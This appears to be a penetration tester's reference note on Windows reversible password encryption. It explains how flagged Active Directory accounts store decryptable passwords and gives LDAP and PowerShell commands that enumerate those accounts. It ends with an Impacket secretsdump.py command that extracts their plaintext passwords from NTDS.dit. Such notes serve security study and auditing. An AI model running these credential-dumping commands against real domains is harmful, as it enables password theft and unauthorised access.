---
Primary_category: "[[WINDOWS CREDENTIALED ENUMERATION]]"
title: "WINDOWS REVERSIBLE ENCRYPTION"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALED ENUMERATION]]

#### *Theory*

*Windows*, either on *SAM* or *NTDS.dit*, stores for all user accounts not their plain password, but rather the *NT Hash*, which results from applying *UTF-16LE* and *MD4* to the password

Those files are encrypted with a *syskey/bootkey* retrieved from *SYSTEM* hive

However, a flag can be set in the *UserAccountControl* attribute of a given domain user account in order to enable *reverse encryption* i.e. Instead of storing the *NT Hash*, the plain password is encrypted by using *RC4* as *encryption algorithm* and the *SYSTEM's Syskey* as *symmetric key*

Needless to say that this is not recommendable as any attacker who has access to the *SYSTEM* hive could rebuild the *syskey* and use it to decrypt the encrypted passwords stored in the *NTDS.dit* file

This feature can be enabled for any user by setting an specific flag in its *UserAccountControl* attribute, namely **`ENCRYPTED_TEXT_PWD_ALLOWED`**

![[WINDOWS REVERSIBLE ENCRYPTION-20251027160124009.webp|250]]

> ***Zoom in***

---

#### *Enumeration - UNIX-Like*

##### *Ldapsearch*

> ***[LDAPSearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)***

> ***Flag Decimal Value → 128***

```bash
ldapsearch -LLL -x -H 'ldap://<DC>' -D '<USER>@<DOMAIN>' -w '<PASSWD>' -b 'DC=<DOMAIN>,DC=<TLD>' '(&(ObjectCategory=person)(ObjectClass=user)(!(samAccountName=krbtgt))(UserAccountControl:1.2.840.113556.1.4.803:=128))' samAccountName dn userPrincipalName
```

---

#### *Enumeration - Windows*

##### *AD Powershell Module*

> ***[AD Powershell Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)***

> ***Get-ADUser***

- ***Filter***

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl | Select samAccountName
```

- ***LDAP Filter***

```powershell
Get-ADUser -Properties * -LDAPFilter '(&(ObjectCategory=person)(UserAccountControl:1.2.840.113556.1.4.803:=128))' | Select samAccountName
```

##### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

> ***Get-DomainUser***

```powershell
Get-DomainUser -Identity * | ? { $_.UserAccountControl -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | Select samAccountName, userAccountControl | fl
```

---

#### *Extraction - UNIX-Like*

Since these encypted passwords are stored in the same way in the *NTDS.dit*, there are tools that automate the *SYSKEY* rebuild from *SYSTEM* and the passwod extraction as well as its subsequent decryption

##### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

With the above command, an operator can dump all the sensitive data, such as plain passwords, for the user accounts that have *reversible encryption* enabled

> ***Filtering by UserAccountControl = 128 
> i.e. Reversible Encryption enabled***

```bash
secretsdump.py -ldapfilter '(userAccountControl:1.2.840.113556.1.4.803:=128)' '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
```